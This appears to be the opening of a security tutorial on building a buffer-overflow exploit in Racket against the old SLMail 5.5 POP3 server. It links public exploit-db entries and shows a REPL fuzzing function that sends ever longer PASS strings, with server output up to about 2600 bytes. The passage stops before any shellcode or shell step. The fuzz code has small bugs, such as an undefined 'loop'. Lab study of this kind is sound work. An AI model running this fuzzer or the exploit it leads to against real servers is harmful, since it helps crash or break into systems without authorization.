This is an exercise in writing an exploit in Racket to demonstrate its flexibility.
We will approach writing an exploit from scratch using Racket from port scanning to shell.


We will target SLMail 5.5, a version of SLMail (from ~2003) that is vulnerable to a buffer-overflow attack.
There is plenty of public exploit code available for SLMail 5.5; here are two links to code archived
in the exploit-database, both of which have been written in C. The exploit database is a reputable source of 
public exploit code for security researchers.

https://www.exploit-db.com/exploits/646/
https://www.exploit-db.com/exploits/638/

Each of these also contain a link to the SLMail 5.5 binary so you can learn the mechanics of the attack by hand.

We will require a couple tools outside of our Racket tool belt, these include


Consider we have used a portscanner (such as RCat) and discovered a mail server sitting on a target machine.
Using some version matching sleuthing we find out this server is a slmail server.



### Using the REPL to fuzz SLMail
```racket
> (define (fuzz n)
        (if (displayln (read-line in))
            (begin
              (displayln "USER test" out)
              (flush-output out)
              (displayln n)
              (displayln (string-append "PASS " (make-string n #\A)) out)
              (flush-output out)
              (displayln (read-line in))
              (sleep 1)
              (loop (+ n 100))) (displayln (string-append "Broke at " n))))
> (fuzz 100)
+OK POP3 server ie8winxp ready <00004.9451406@ie8winxp>

100
+OK test welcome here

-ERR unable to lock mailbox

200
+OK test welcome here

-ERR unable to lock mailbox

```
...
```racket

2400
+OK test welcome here

-ERR unknown command

2500
+OK test welcome here

-ERR unknown command

2600
+OK test welcome here

```
